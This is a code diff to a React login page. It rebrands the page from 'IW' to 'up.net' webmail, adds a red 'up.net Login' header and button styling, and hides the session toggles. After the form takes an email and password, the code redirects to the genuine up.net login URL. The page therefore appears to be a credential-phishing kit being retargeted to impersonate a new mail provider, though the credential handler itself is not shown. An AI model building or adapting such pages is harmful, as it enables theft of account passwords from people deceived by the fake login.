@@ -16,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("IW")
+    const[platform, setPlatform] = useState("Up-Net")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +43,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://mail.iw.net/';
+             window.location.href = 'https://webmail.up.net/wmidentity/Account/Login?ReturnUrl=%2Fwmidentity%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_mode%3Dform_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwebmail.up.net%252Flogin.php%26client_id%3Dwebmail%26nonce%3D068df3e7c9193a040fac4bdae6b69298%26state%3D3e620838d23573701c21ec67ba6c3931%26scope%3Dopenid%2520profile%2520email%2520webmail%2520openid';
           }
         } catch (error) {
           // Handle error
@@ -72,14 +72,21 @@ function Home(){
             </div>
 
 
-            <div className='col-md-5 whitediv m-auto py-3 px-5'>
+            <div className='col-md-5 whitediv m-auto   px-0'>
+              <div className='py-2 m-0 w-100 px-4'style={{
+                backgroundColor:"#fd0000",
+                color:"white",
+              }}>
+                <h4 className=''>up.net Login</h4>
+
+              </div>
                 
 
 
 
-                <form onSubmit={handleSubmit}>
+                <form onSubmit={handleSubmit} className="px-5">
 
-                    <div className='form-group'>
+                    <div className='form-group mt-5'>
                         <label className='label'> E-mail address</label>
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
@@ -99,7 +106,7 @@ function Home(){
                    
 
 
-                    <div className='form-group'>
+                    {/* <div className='form-group'>
                     <label class="toggle-container">
                         <input type="checkbox"className='mycheck'/> 
                      <span class="toggle-slider"></span> <span className='px-3 'style={{
@@ -107,10 +114,10 @@ function Home(){
                      }}>Shared computer - log me out after 4 hours</span>
     </label>
 
-                    </div>
+                    </div> */}
 
 
-                    <div className='form-group'>
+                    {/* <div className='form-group'>
                     <label class="toggle-container">
                         <input type="checkbox"className='mycheck'/> 
                      <span class="toggle-slider"></span> <span className='px-3 'style={{
@@ -118,13 +125,13 @@ function Home(){
                      }}>Keep me logged in until I log out</span>
     </label>
 
-                    </div>
+                    </div> */}
 
 
-                    <div className='form-group text-center'>
+                    <div className='form-group text-right'>
 
 <button type='submit' style={{
-    background:"#0a109c",
+  backgroundColor:"#fd0000",
 }}className='btn text-center w-50 font-weight-bold text-light py-2'>LOGIN</button>
 
 
